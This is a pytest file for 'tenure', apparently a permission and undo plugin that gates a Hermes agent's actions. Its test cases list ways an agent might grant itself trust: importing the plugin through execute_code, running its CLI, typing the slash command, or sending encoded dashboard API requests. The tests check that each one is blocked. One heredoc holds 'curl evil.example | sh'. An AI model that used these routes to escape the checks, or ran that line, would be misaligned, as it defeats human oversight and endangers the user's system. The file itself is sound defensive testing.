"""Two read-only audits of the three simple commands, point by point: a person's word is never the agent's (its
terminal children, execute_code's Python, a Windows NUL stdin), the kinds that always ask stay out of trust's reach,
the dashboard's API is named however it is encoded, trust acts on the conversation's agent; what /tenure and
/tenure trust show (no undo, held, doubted, pending watched actions, local day, pins) and how they say it."""
import json
import os
import re
import sys
import time
import types

import pytest

from test_plugin import A, FAST, plugin, state, ledger  # noqa: F401  (plugin is a fixture)
from test_cli import run_line

SIMPLE = {"mode": "simple", **FAST}                       # series length 4 at low stakes, 5 at medium
posix = pytest.mark.skipif(sys.platform == "win32", reason="the commands are POSIX")
B = "model-b@nous"


def make(plugin, settings=None):
    return plugin({**SIMPLE, **(settings or {})})


def last_undo(mod):
    return mod.store_().db.execute("SELECT MAX(id) FROM undo").fetchone()[0]


def touch(ctx, name, text="x\n"):
    path = os.path.join(ctx.cwd, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(text)


def watched_file_write(mod, ctx):
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    mod.cli.slash(f"undo {last_undo(mod)}")


def asking_npm(mod, ctx):
    ctx.call("terminal", {"command": "npm test"})
    mod.cli.slash("flag shell:npm")


def stable(s):
    return {**s.to_dict(), "changed_at": 0}


def live_is_replay(mod, agent=A):
    st = mod.store_()
    replayed = mod.passport.replay(st.ledger())[agent]
    assert {s.key: stable(s) for _, s in st.states(agent)} == {k: stable(s) for k, s in replayed.items()}


def trust_line(mod, key, **kw):
    return next(ln for ln in mod.cli.slash("trust", **kw).splitlines() if ln.startswith(f"  {key} "))


# ------------------------------------------------------------------- 1. a person's word, never the agent's
@posix
@pytest.mark.parametrize("marker", ["TENURE_AGENT_CHILD", "HERMES_RPC_TOKEN", "HERMES_RPC_SOCKET", "HERMES_RPC_DIR",
                                    "HERMES_KERNEL_SENTINEL"])
def test_1_the_agents_own_processes_cannot_give_a_persons_word_even_through_slash(plugin, monkeypatch, marker):
    mod, ctx = make(plugin)
    asking_npm(mod, ctx)
    watched_file_write(mod, ctx)
    seq = mod.excusable(mod.store_())[0]["seq"]
    monkeypatch.setenv(marker, "1")
    assert mod.agent_process() == marker
    for line in ("trust shell:npm", "trust shell:npm ask", f"excuse {seq}", "excuse", "ok 1", "ok"):
        out = mod.cli.slash(line)                                    # the entry point Hermes' chat uses
        assert "only you" in out, line
    with pytest.raises(mod.cli.CliError):                            # the CLI function itself
        mod.cli.trust_set("shell:npm", mod.rule.FREE)
    ns = types.SimpleNamespace(tenure_command="trust", kind="shell:npm", level=None, model=None, tenure_slash=True)
    out, code = mod.cli.execute(ns)                                   # execute() with the slash flag set by hand
    assert code == 1 and "only you" in out
    with mod.txn() as st:                                            # the core functions refuse too
        for fn in (lambda: mod.owner_trust(st, mod.settings(), A, state(mod, "shell:npm"), mod.rule.FREE),
                   lambda: mod.seen(st, [1]), lambda: mod.excuse(st, seq)):
            with pytest.raises(ValueError):
                fn()
    assert not ledger(mod, "trust") and not ledger(mod, "excuse")
    assert "shell:npm" in mod.cli.slash("trust")                     # the list reads only: open to anyone


def test_1_execute_code_python_is_recognised_by_its_rpc_endpoint(plugin, monkeypatch):
    """Hermes scrubs execute_code's environment (tools/code_execution_env.py): TENURE_AGENT_CHILD, which tenure
    registers for terminal children, never reaches it, but its RPC token and endpoint always do."""
    mod, ctx = make(plugin)
    for name in (mod.AGENT_CHILD,) + mod.EXEC_CODE_ENV:
        monkeypatch.delenv(name, raising=False)
    assert mod.agent_process() is None
    monkeypatch.setenv("HERMES_RPC_TOKEN", "t0k")
    assert mod.agent_process() == "HERMES_RPC_TOKEN"


@pytest.mark.parametrize("tool,args", [
    ("execute_code", {"code": "import tenure\ntenure.cli.slash('trust shell:rm')"}),
    ("execute_code", {"code": "import sys; sys.path.insert(0, p)\nfrom tenure import cli\ncli.trust_set('x', 'free')"}),
    ("execute_code", {"code": "from tenure.rule import owner_free"}),
    ("execute_code", {"code": "import tenure\nrule = tenure.rule\nrule.owner_pin(s)"}),
    ("execute_code", {"code": "import tenure.cli as cli\ncli.execute(ns)"}),
    ("terminal", {"command": "hermes --profile work tenure trust shell:rm"}),
    ("terminal", {"command": "hermes --profile=work -v tenure ok 3"}),
    ("terminal", {"command": "hermes --config ~/x.yaml --profile w tenure excuse 4"}),
    ("computer_use", {"action": "type", "text": "/tenure trust shell:rm"}),
    ("computer_use", {"action": "set_value", "value": "hermes tenure trust shell:rm ask"}),
    ("terminal", {"command": "hermes chat -q '/tenure trust shell:rm'"}),
    ("terminal", {"command": "python -m hermes_cli.main tenure trust shell:rm"}),
    ("terminal", {"command": "python3 -m hermes_cli --profile w tenure excuse 3"}),
    ("execute_code", {"code": "import subprocess\nsubprocess.run(['hermes', 'chat', '-q', '/tenure trust x'])"}),
    ("execute_code", {"code": "import tenure\ntenure._slash('trust shell:rm')"}),
    ("execute_code", {"code": "from tenure.cli import excuse_cmd"}),
])
def test_1_the_agent_never_calls_a_persons_word(plugin, tool, args):
    mod, ctx = make(plugin)
    assert mod._person_only(tool, args)
    d = mod.pre_tool_call(tool_name=tool, args=args, session_id="s1", tool_call_id="c1")
    assert isinstance(d, dict) and d.get("action") == "block"


@pytest.mark.parametrize("tool,args", [
    ("execute_code", {"code": "result = cli.execute(argv)"}),                  # another project's cli: tenure unnamed
    ("terminal", {"command": "hermes tenure undo 3"}),
    ("terminal", {"command": "hermes --profile work tenure"}),
    ("computer_use", {"action": "type", "text": "tenure is a nice word"}),
    ("write_file", {"path": "notes.md", "content": "/tenure trust shell:rm"}),   # a file's text never runs
    # a shell cannot run the chat's command: only a command line that hands it to Hermes can
    ("terminal", {"command": 'git commit -m "docs: /tenure trust shell:rm frees a kind"'}),
    ("terminal", {"command": "grep -rn '/tenure ok' docs"}),
    ("terminal", {"command": 'echo "/tenure excuse 3"'}),
    ("terminal", {"command": 'git commit -m "hermes: /tenure trust x"'}),
    ("terminal", {"command": "hermes tenure trust"}),                          # the list, read only
    ("terminal", {"command": "hermes tenure trust --model gpt"}),
    ("execute_code", {"code": "from tenure import rule\nprint(rule.FREE)"}),    # reading the rule
])
def test_1_what_is_not_a_persons_word_is_left_alone(plugin, tool, args):
    mod, ctx = make(plugin)
    assert not mod._person_only(tool, args)


# ----------------------------------------------------------------------- 2. Windows: NUL is not a console
class _Stdin:
    def __init__(self, tty=True):
        self.tty = tty

    def isatty(self):
        return self.tty

    def fileno(self):
        return 0


def _windows(monkeypatch, console: bool):
    import ctypes
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(sys, "stdin", _Stdin(tty=True))              # NUL answers isatty() too
    monkeypatch.setitem(sys.modules, "msvcrt", types.SimpleNamespace(get_osfhandle=lambda fd: 42))
    kernel32 = types.SimpleNamespace(GetConsoleMode=lambda handle, mode: 1 if console else 0)
    monkeypatch.setattr(ctypes, "windll", types.SimpleNamespace(kernel32=kernel32), raising=False)


def test_2_windows_nul_is_not_a_person(plugin, monkeypatch):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)
    _windows(monkeypatch, console=False)
    assert mod.cli.interactive() is False
    out, code = run_line(mod, "trust file:write")
    assert code == 1 and "a person's word" in out and not ledger(mod, "trust")


def test_2_windows_console_is_a_person(plugin, monkeypatch):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)
    _windows(monkeypatch, console=True)
    assert mod.cli.interactive() is True
    out, code = run_line(mod, "trust file:write")
    assert code == 0 and "runs without asking again" in out


def test_2_the_marker_comes_first_even_on_a_console(plugin, monkeypatch):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)
    _windows(monkeypatch, console=True)
    monkeypatch.setenv("TENURE_AGENT_CHILD", "1")
    out, code = run_line(mod, "trust file:write")
    assert code == 1 and "only you" in out


def test_2_no_console_api_means_no_person(monkeypatch):
    from tenure import cli
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(sys, "stdin", _Stdin(tty=True))
    monkeypatch.setitem(sys.modules, "msvcrt", None)                 # import fails: refused, never assumed
    assert cli.interactive() is False
    monkeypatch.setattr(sys, "stdin", _Stdin(tty=False))
    monkeypatch.setattr(sys, "platform", "linux")
    assert cli.interactive() is False


# --------------------------------------------------------------- 3. what always asks stays out of trust's reach
@posix
def test_3_pinning_what_always_asks_writes_nothing_and_freeing_it_is_refused(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "git push origin main"})
    before = len(mod.store_().ledger())
    out = mod.cli.slash("trust shell:git:push ask")
    assert out == "shell:git:push already always asks: nothing to change."
    out = mod.cli.slash("trust shell:git:push")
    assert "can't be freed by hand" in out and "free again" not in out and "without asking" not in out
    assert len(mod.store_().ledger()) == before and not state(mod, "shell:git:push").pinned


@posix
def test_3_a_legacy_pin_on_what_always_asks_is_refused_before_its_state(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "git push origin main"})
    with mod.txn() as st:                                            # a pin written before this check existed
        mod.owner_trust(st, mod.settings(), A, state(mod, "shell:git:push"), mod.rule.PIN)
    assert state(mod, "shell:git:push").pinned
    out = mod.cli.slash("trust shell:git:push")
    assert "can't be freed by hand" in out


def test_3_owner_free_always_lifts_the_pin():
    from tenure import rule
    for key, stakes, n in (("shell:git:push", "medium", 5), ("shell:ssh", "high", None), ("file:write", "low", None)):
        s = rule.TypeState(key=key, stakes=stakes, pinned=True)
        assert rule.owner_free(s, n) == [] and not s.pinned and s.tier == rule.T1 and not s.owner_freed


# ------------------------------------------------------------- 4. the dashboard's API, however it is encoded
@pytest.mark.parametrize("url", ["http://127.0.0.1:9119/api/plugins/%74enure/settings",
                                 "http://127.0.0.1:9119/api/plugins/%2574enure/settings",
                                 "http://127.0.0.1:9119/api/plugins/%54ENURE/undo/3",
                                 "http://127.0.0.1:9119/api/plugins/tenure%2Fsettings"])
def test_4_a_percent_encoded_dashboard_path_is_tenures_own(url):
    from tenure import classify
    assert classify.classify("terminal", {"command": f"curl -X PUT {url} -d x"}, cwd="/tmp").type == "self:tenure"
    code = f"import urllib.request as u\nu.urlopen({url!r}, data=b'x')"
    assert classify.classify("execute_code", {"code": code}, cwd="/tmp").type == "self:tenure"
    assert classify.tenure_named(url.casefold())


@pytest.mark.parametrize("url", ["http://127.0.0.1:9119/api/plugins/x/../tenure/settings",
                                 "http://127.0.0.1:9119/api/plugins/./tenure/undo/3",
                                 "http://127.0.0.1:9119/api/plugins/x/%2e%2e/tenure/settings"])
def test_4_dot_segments_are_resolved_before_matching(url):
    from tenure import classify
    assert classify.classify("terminal", {"command": f"curl -X PUT {url} -d x"}, cwd="/tmp").type == "self:tenure"
    assert classify.classify("terminal", {"command": "cd ../app && npm test"}, cwd="/tmp").type == "shell:npm"


def test_4_ordinary_encoded_urls_are_left_alone():
    from tenure import classify
    assert not classify.tenure_named("https://example.com/a%20b/%74est")
    assert classify.classify("terminal", {"command": "npm test"}, cwd="/tmp").type == "shell:npm"


# ------------------------------------------------------------------- 5. trust acts on the conversation's agent
@posix
def test_5_trust_from_a_conversation_acts_on_its_agent_and_names_it(plugin):
    mod, ctx = make(plugin)
    asking_npm(mod, ctx)                                              # model-a, conversation s1
    mod.pre_api_request(model="model-b", provider="nous", session_id="s2")   # model-b takes the record over in s2
    mod.pre_api_request(model="model-a", provider="nous", session_id="s1")   # the profile's last agent: model-a
    assert state(mod, "shell:npm", B).tier == mod.rule.T1
    assert f"({B})" in mod.cli.slash("trust", session_id="s2")
    out = mod.cli.slash("trust shell:npm", session_id="s2")
    assert out.endswith(f"(For {B}.)")
    assert state(mod, "shell:npm", B).tier == mod.rule.T3 and state(mod, "shell:npm").tier == mod.rule.T1
    assert ledger(mod, "trust")[-1]["agent"] == B
    live_is_replay(mod, B)


@posix
def test_5_one_agent_needs_no_name(plugin):
    mod, ctx = make(plugin)
    asking_npm(mod, ctx)
    assert "(For " not in mod.cli.slash("trust shell:npm", session_id="s1")


# ------------------------------------------------- 6. no undo, held, doubted: listed with a reason, explained
@posix
def test_6_a_kind_tenure_cannot_undo_is_listed_with_its_reason(plugin):
    mod, ctx = make(plugin)
    assert ctx.call("terminal", {"command": "docker build ."}) == "approved"
    assert "can't tell which files it changes" in ctx.prompts[-1]["message"]
    assert "asks: tenure can't undo it" in trust_line(mod, "shell:docker")
    assert "shell:docker (docker commands)" in trust_line(mod, "shell:docker")
    assert "Asks you first: shell:docker (docker commands: tenure can't undo it)." in mod.cli.slash("")


def _held(plugin):
    from tenure import rule
    mod, ctx = make(plugin, {"fields": {"stakes": {"finance": "medium"}}})
    parent, child = "mcp:crm:update_contact", "mcp:crm:update_contact:@finance"
    with mod.txn() as st:
        st.put_state(A, rule.TypeState(key=parent, stakes="medium", tier=rule.T1, faults=1, distrusted=True))
        st.put_state(A, rule.TypeState(key=child, stakes="medium"))
    return mod, ctx, parent, child


def test_6_a_held_kind_says_what_holds_it_and_freeing_the_parent_releases_it(plugin):
    mod, ctx, parent, child = _held(plugin)
    assert f"asks while {parent} has a mistake to make up for" in trust_line(mod, child)
    assert f"waits for {parent}" in mod.cli.slash("")
    out = mod.cli.slash(f"trust {child}")
    assert out == (f"{child} waits while {parent} has a mistake to make up for: /tenure trust {parent} frees {parent},"
                   f" and {child} with it.")
    assert not ledger(mod, "trust")                                  # explained: nothing written
    out = mod.cli.slash(f"trust {parent}")
    assert f"No longer waiting for it: {child}." in out
    assert mod._held_by(mod.store_(), A, child) is None


@posix
def test_6_a_doubted_kind_is_explained_not_freed(plugin):
    mod, ctx = make(plugin)
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    mod.cli.slash("flag 1 --doubt")
    assert "asks once: a check doubted its last action" in trust_line(mod, "file:write")
    assert "file:write (file edits in the project: a check doubted it)" in mod.cli.slash("")
    out = mod.cli.slash("trust file:write")
    assert out.startswith("A check doubted the last file:write action") and not ledger(mod, "trust")


# ------------------------------------------- 7. a kind tenure cannot undo is freed on the person's word
@posix
def test_7_trust_frees_a_kind_tenure_cannot_undo_and_a_mistake_makes_it_ask_again(plugin):
    mod, ctx = make(plugin)
    assert ctx.call("terminal", {"command": "docker build ."}) == "approved"
    out = mod.cli.slash("trust shell:docker")
    assert out == ("shell:docker now runs without asking, on your word. tenure can't undo it. To take this back: "
                   "/tenure trust shell:docker ask. One mistake and it asks again.")
    assert ledger(mod, "trust")[-1] == {"event": "trust", "agent": A, "type": "shell:docker", "to": "free",
                                        "undo": False}
    s = state(mod, "shell:docker")
    assert s.owner_freed and s.tier == mod.rule.T3
    undos = last_undo(mod)
    assert ctx.call("terminal", {"command": "docker build ."}) == "ran"      # no question, no undo
    assert last_undo(mod) == undos
    assert "shell:docker" not in mod.cli.slash("trust")
    live_is_replay(mod)
    mod.cli.slash("flag shell:docker")                                        # a mistake: it asks again, at once
    s = state(mod, "shell:docker")
    assert not s.owner_freed and s.tier == mod.rule.T1
    assert ctx.call("terminal", {"command": "docker build ."}) == "approved"
    live_is_replay(mod)


@posix
def test_7_the_study_replay_ignores_the_freedom_given_by_hand(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "docker build ."})
    mod.cli.slash("trust shell:docker")
    study, _ = mod.passport._replay(mod.store_().ledger(), mod.rule.STUDY)
    assert not any(s.owner_freed for s in study.values())


# ---------------------------------------------------- 8. the watched countdown counts what already waits
@posix
def test_8_watched_actions_inside_their_window_count_in_the_countdown(plugin):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)                                      # watched: 4 actions kept
    assert "free after 4 more actions you keep" in trust_line(mod, "file:write")
    for i in range(2):
        assert ctx.call("write_file", {"path": f"src/w{i}.py", "content": "x = 1\n"}) == "ran"
    assert "free after 2 more actions you keep" in trust_line(mod, "file:write")
    for i in range(2, 4):
        ctx.call("write_file", {"path": f"src/w{i}.py", "content": "x = 1\n"})
    assert "free within 24 hours if you keep its listed actions" in trust_line(mod, "file:write")


# ------------------------------------------------------------------------- 9. "today" is the owner's day
@pytest.mark.skipif(not hasattr(time, "tzset"), reason="time.tzset is POSIX")
def test_9_today_is_the_local_day(plugin):
    mod, ctx = make(plugin)
    old = os.environ.get("TZ")
    try:
        os.environ["TZ"] = "Pacific/Kiritimati"                      # UTC+14: local midnight is 10:00 UTC
        time.tzset()
        midnight = time.mktime((2026, 11, 21, 0, 0, 0, 0, 0, -1))
        st = mod.store_()
        with mod.txn() as wst:
            wst.bump(A, "alone", at=midnight - 600)                   # local yesterday 23:50, UTC 2026-11-20 09:50
            wst.bump(A, "alone", 2, at=midnight + 600)                # local today, also UTC 2026-11-20
        assert st.totals(None, midnight + 1800)["alone"] == 2         # the UTC day would count 3
        assert st.totals(None, midnight - 1800)["alone"] == 3
    finally:
        if old is None:
            os.environ.pop("TZ", None)
        else:
            os.environ["TZ"] = old
        time.tzset()


# ------------------------------------------------------- 10. a pinned kind never offers "for this session"
@posix
def test_10_a_pinned_kind_asks_every_time(plugin):
    mod, ctx = make(plugin)
    assert ctx.call("terminal", {"command": "docker build ."}) == "approved"
    assert ctx.prompts[-1]["rule_key"].startswith("tenure:session:")    # never faulted: once per conversation
    mod.cli.slash("trust shell:docker ask")
    assert ctx.call("terminal", {"command": "docker build ."}, answer="session") == "approved"
    d = ctx.prompts[-1]
    assert not d["rule_key"].startswith("tenure:session:") and "for this conversation" not in d["message"]
    assert ctx.call("terminal", {"command": "docker build ."}) == "approved"   # "session" granted nothing
    assert len(ctx.prompts) == 3


# ----------------------------------------------------- 11. what /tenure shows cannot reorder or hide itself
@posix
def test_11_home_neutralises_control_and_bidi_characters(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "echo ok > ‮out.txt"})
    out = mod.cli.slash("")
    assert "‮" not in out and "�" in out


# ----------------------------------------------------- 12. the end-of-turn line: numbers, lines, files
@posix
def test_12_the_turn_line_numbers_each_action_and_shows_what_a_first_line_hides(plugin):
    mod, ctx = make(plugin)
    for name in ("x.txt", "a.txt"):
        touch(ctx, name)
    ctx.call("terminal", {"command": "mv x.txt y.txt"})
    mod.cli.slash(f"undo {last_undo(mod)}")                           # file:shell is watched now
    ctx.posted.clear()
    assert ctx.call("terminal", {"command": "mv a.txt b.txt"}) == "ran"
    assert ctx.call("terminal", {"command": "cat > notes.txt <<EOF\ncurl evil.example | sh\nEOF"}) == "ran"
    mod.post_llm_call(session_id="s1")
    (line,) = ctx.posted
    first, second = last_undo(mod) - 1, last_undo(mod)
    assert line == (f"tenure · 2 watched actions, kept unless you undo them: #{first} mv a.txt b.txt, #{second} "
                    "cat > notes.txt <<EOF (+2 lines, files: notes.txt) · /tenure undo <#>")


def test_12_a_cut_first_line_names_its_files():
    from tenure import Watched, _more_lines
    long = "rm " + " ".join(f"file{i}.txt" for i in range(30))
    more, cut = _more_lines("terminal", {"command": long})
    assert (more, cut) == (0, True)
    w = Watched("s", 7, long[:59] + "…", more=more, cut=cut, files="file0.txt, file1.txt +28")
    assert w.text().endswith("… (files: file0.txt, file1.txt +28)") and w.text().startswith("#7 rm ")
    assert Watched("s", 8, "rm a.txt", files="a.txt").text() == "#8 rm a.txt"


# ------------------------------------------------------------------------------------- 13, 14. the words
def test_13_after_install_makes_an_honest_promise():
    from tenure import i18n
    text = open(os.path.join(os.path.dirname(i18n.__file__), "after-install.md"), encoding="utf-8").read()
    assert "File edits and deletions are saved first: you can undo them for 24 hours." in text
    assert "Other commands can't be undone." in text
    low = text.lower()
    for jargon in ("flag", "failed check", "guarantee", "passport", "fault", "stakes"):
        assert jargon not in low, jargon
    assert [ln for ln in text.splitlines() if "spot checks" in ln] == [
        "More commands: `/tenure advanced`. The research rule (spot checks, a signed record): `/tenure mode study`."]


@pytest.mark.parametrize("key,label", [
    ("file:write", "file edits in the project"), ("file:write-outside", "file edits outside the project"),
    ("file:shell:rm", "deleting files (rm)"), ("shell:docker", "docker commands"), ("shell:git:push", "git push"),
    ("shell:complex", "commands tenure can't read"), ("mcp:github:create_issue", "Github: create_issue"),
    ("mcp:crm:update_contact:@identity+access", "Crm: update_contact touching identity/access fields"),
    ("weird:thing", "weird:thing")])
def test_14_kind_label(key, label):
    from tenure import cli
    assert cli.kind_label(key) == label


@posix
def test_14_simple_words_in_prompts_and_study_words_unchanged(plugin):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)
    watched_file_write(mod, ctx)                                      # a second mistake: it asks first
    ctx.call("write_file", {"path": "src/b.py", "content": "x = 1\n"})
    msg = ctx.prompts[-1]["message"]
    assert "Deny it if it's wrong: tenure will then watch this kind more closely." in msg
    assert "Hermes' \"Always\" is ignored here: tenure decides each time." in msg
    assert not re.search(r"\b(?:fault|stakes)\b", msg)
    mod2, ctx2 = plugin({"mode": "study", **FAST})
    ctx2.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    msg = ctx2.prompts[-1]["message"]
    assert "Deny it if it is wrong: that counts as a fault." in msg and "does not carry over" in msg


@posix
def test_14_a_first_undo_says_two_short_lines(plugin):
    mod, ctx = make(plugin)
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    out = mod.cli.slash(f"undo {last_undo(mod)}")
    lines = out.splitlines()
    assert len(lines) == 2
    assert lines[0] == (f"Undone #{last_undo(mod)}: files restored (file:write). file:write is now watched; a second "
                        "mistake and it asks first.")
    assert lines[1].startswith("Undid or refused a correct action? /tenure excuse ") and lines[1].endswith(
        "min and it won't count.")
    lst = mod.cli.slash("undo")
    assert lst.startswith("Nothing to undo from the last 24 hours.")


@posix
def test_14_simple_texts_drop_the_jargon(plugin):
    mod, ctx = make(plugin)
    watched_file_write(mod, ctx)
    asking_npm(mod, ctx)
    ctx.call("terminal", {"command": "git push origin main"})
    ctx.call("write_file", {"path": "src/c.py", "content": "x = 1\n"})
    mod.post_llm_call(session_id="s1")
    texts = [mod.cli.slash(x) for x in ("", "trust", "undo", "help", "trust shell:git:push")]
    texts += [str(p) for p in ctx.posted]
    for t in texts:
        for word in ("fault", "stakes", "capped", "verified outcome", "taken alone", "simple rule", "Suspended by",
                     "at watched"):
            assert not re.search(rf"\b{word}\b", t), (word, t)


# ---------------------------------------------------------------------- 15. trust names a kind by its end
@posix
def test_15_trust_takes_a_unique_suffix_or_program_name(plugin):
    mod, ctx = make(plugin)
    ctx.call("terminal", {"command": "docker build ."})
    out = mod.cli.slash("trust docker")
    assert out.startswith("shell:docker now runs without asking")
    asking_npm(mod, ctx)
    assert mod.cli.slash("trust npm").startswith("shell:npm runs without asking again")


@posix
def test_15_an_ambiguous_name_lists_the_candidates_and_writes_nothing(plugin):
    mod, ctx = make(plugin)
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    with mod.txn() as st:
        from tenure import rule
        st.put_state(A, rule.TypeState(key="memory:write", stakes="low", reversible=True, tier=rule.T1, faults=1,
                                       distrusted=True))
    out = mod.cli.slash("trust write")
    assert out == "write matches several kinds: file:write, memory:write. Name one: /tenure trust <kind>"
    assert not ledger(mod, "trust")
    out = mod.cli.slash("trust kubectl")
    assert out.startswith(f"No record of shell:kubectl for {A}.")


# ---------------------------------------------------------------------------- 16, 17. protocol, advanced
def test_16_the_protocol_lists_seven_input_kinds_with_trust():
    from pathlib import Path
    proto = (Path(__file__).resolve().parents[1] / "docs" / "protocol.md").read_text(encoding="utf-8")
    assert "Only these seven kinds are read by a replay" in proto and "| `trust` |" in proto
    assert "verifies with Tenure 1.4" in proto and "earned-autonomy/0.2" in proto


def test_17_advanced_lists_flag_n_doubt(plugin):
    mod, ctx = make(plugin)
    out = mod.cli.slash("advanced")
    assert any(ln.split()[:3] == ["flag", "N", "--doubt"] for ln in out.splitlines())
    for lang in ("fr", "es", "zh", "ar"):
        from tenure import i18n
        cat = json.load(open(os.path.join(i18n.LOCALES_DIR, lang, "core.json"), encoding="utf-8"))
        assert "    flag N --doubt " in cat["cli.usage"], lang


# ------------------------------------------- 18. only a call that really changed files keeps its undo
def _rm_build(ctx):
    for name in ("build/a.txt", "build/sub/b.txt"):
        touch(ctx, name, name)
    return {"command": "rm -rf build"}


def _no_trace(mod, ctx, snaps_before):
    assert last_undo(mod) is None
    ctx.posted.clear()
    mod.post_llm_call(session_id="s1")
    assert ctx.posted == []                                          # no end-of-turn line
    assert os.path.exists(os.path.join(ctx.cwd, "build", "a.txt"))
    undo_dir = os.path.join(mod.data_dir(), "undo")
    assert set(os.listdir(undo_dir) if os.path.isdir(undo_dir) else []) == snaps_before   # the snapshot is gone


def _snaps(mod):
    undo_dir = os.path.join(mod.data_dir(), "undo")
    return set(os.listdir(undo_dir) if os.path.isdir(undo_dir) else [])


@posix
@pytest.mark.parametrize("result", [
    # tools/terminal_tool.py: Hermes' own approval timed out, was refused or never delivered
    '{"output": "", "exit_code": -1, "error": "BLOCKED: Command timed out without user response.", "status": "blocked"}',
    '{"output": "", "exit_code": -1, "error": "BLOCKED: Failed to send approval request to user.", "status": "blocked"}',
    # gateway ask mode: queued for /approve, not run
    '{"output": "", "exit_code": -1, "error": "", "status": "pending_approval", "approval_pending": true, '
    '"command": "rm -rf build", "pattern_key": "recursive delete"}',
])
def test_18_a_call_hermes_did_not_run_keeps_no_undo_and_no_line(plugin, result):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = _rm_build(ctx)
    snaps = _snaps(mod)
    assert pre(mod, "terminal", args, "c1") is None                  # tenure lets it through, files saved
    assert len(_snaps(mod)) == len(snaps) + 1
    post(mod, "terminal", args, "c1", status="error", result=result)  # the hook's status says only "error"
    _no_trace(mod, ctx, snaps)
    assert [e["source"] for e in ledger(mod, "outcome")] in ([], ["blocked"])


@posix
def test_18_a_call_the_hook_reports_blocked_keeps_no_undo(plugin):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = _rm_build(ctx)
    snaps = _snaps(mod)
    pre(mod, "terminal", args, "c1")
    post(mod, "terminal", args, "c1", status="blocked", result='{"error": "blocked"}')
    _no_trace(mod, ctx, snaps)


@posix
def test_18_a_call_refused_at_hermes_own_prompt_keeps_no_undo(plugin):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = _rm_build(ctx)
    snaps = _snaps(mod)
    pre(mod, "terminal", args, "c1")
    mod.post_approval_response(pattern_key="recursive delete", tool_call_id="c1", choice="deny", session_id="s1")
    post(mod, "terminal", args, "c1", status="error",
         result='{"output": "", "exit_code": -1, "error": "BLOCKED: User denied this command.", "status": "blocked"}')
    _no_trace(mod, ctx, snaps)
    assert state(mod, "file:shell:rm").faults == 1                   # the person's no is still a mistake


@posix
def test_18_a_failed_call_that_changed_nothing_keeps_no_undo(plugin):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = _rm_build(ctx)
    snaps = _snaps(mod)
    pre(mod, "terminal", args, "c1")
    post(mod, "terminal", args, "c1", status="error",                 # an error before anything was removed
         result='{"output": "rm: build: Operation not permitted", "exit_code": 1, "error": "exit 1"}')
    _no_trace(mod, ctx, snaps)
    assert [e["source"] for e in ledger(mod, "outcome")] in ([], ["error"])


@posix
def test_18_a_failed_call_that_changed_files_keeps_its_undo(plugin):
    from test_plugin import pre, post
    mod, ctx = make(plugin)
    args = _rm_build(ctx)
    pre(mod, "terminal", args, "c1")
    os.remove(os.path.join(ctx.cwd, "build", "a.txt"))
    post(mod, "terminal", args, "c1", status="error", result='{"output": "", "exit_code": 1, "error": "cut"}')
    assert last_undo(mod) is not None
    ctx.posted.clear()
    mod.post_llm_call(session_id="s1")
    assert len(ctx.posted) == 1 and f"#{last_undo(mod)} rm -rf build" in ctx.posted[0]


@posix
@pytest.mark.parametrize("result", [
    '{"output": "", "exit_code": -1, "error": "BLOCKED: Command timed out without user response.", "status": "blocked"}',
    '{"output": "", "exit_code": 1, "error": "exit 1"}'])
def test_18_study_mode_keeps_no_undo_and_the_same_ledger(plugin, result):
    """Study mode: a call Hermes did not run, or a failed one that changed nothing, keeps no undo and posts nothing;
    its outcome is the one it always had (neutral, error), so the ledger and the study replay do not change."""
    from test_plugin import pre, post
    mod, ctx = plugin({"mode": "study", "start": "trusted", **FAST})
    touch(ctx, "c.txt", "c")
    args = {"command": "rm c.txt"}
    assert pre(mod, "terminal", args, "c1") is None                  # trusted start: runs, its file saved
    ctx.posted.clear()
    post(mod, "terminal", args, "c1", status="error", result=result)
    assert last_undo(mod) is None and ctx.posted == []
    assert [(e["result"], e["source"]) for e in ledger(mod, "outcome")] == [("neutral", "error")]
    live = {s.key: stable(s) for _, s in mod.store_().states(A)}
    assert live == {k: stable(s) for k, s in mod.passport.replay(mod.store_().ledger())[A].items()}


# ------------------------------------------- 2'. a freedom without an undo only where none can be prepared
@posix
def test_2b_a_watched_kind_freed_keeps_its_undo_and_asks_when_files_cannot_be_saved(plugin, monkeypatch):
    mod, ctx = make(plugin)
    for name in ("x.txt", "a.txt", "b.txt"):
        touch(ctx, name)
    ctx.call("terminal", {"command": "rm x.txt"})
    mod.cli.slash(f"undo {last_undo(mod)}")                           # file:shell:rm watched
    out = mod.cli.slash("trust file:shell:rm")
    assert out.startswith("file:shell:rm runs without asking again.") and "can't undo" not in out
    assert ledger(mod, "trust")[-1] == {"event": "trust", "agent": A, "type": "file:shell:rm", "to": "free"}
    assert not state(mod, "file:shell:rm").owner_freed
    undos = last_undo(mod)
    assert ctx.call("terminal", {"command": "rm a.txt"}) == "ran" and last_undo(mod) == undos + 1   # with its undo
    monkeypatch.setattr(mod.undo, "snapshot", lambda *a, **k: None)   # its files cannot be saved now
    assert ctx.call("terminal", {"command": "rm b.txt"}) == "approved"                 # asks, as a free kind does
    live_is_replay(mod)


def test_2b_a_replay_refuses_a_bad_undo_field(plugin):
    mod, ctx = make(plugin)
    ctx.call("write_file", {"path": "src/a.py", "content": "x = 1\n"})
    rows = mod.store_().ledger()
    head = rows[-1]
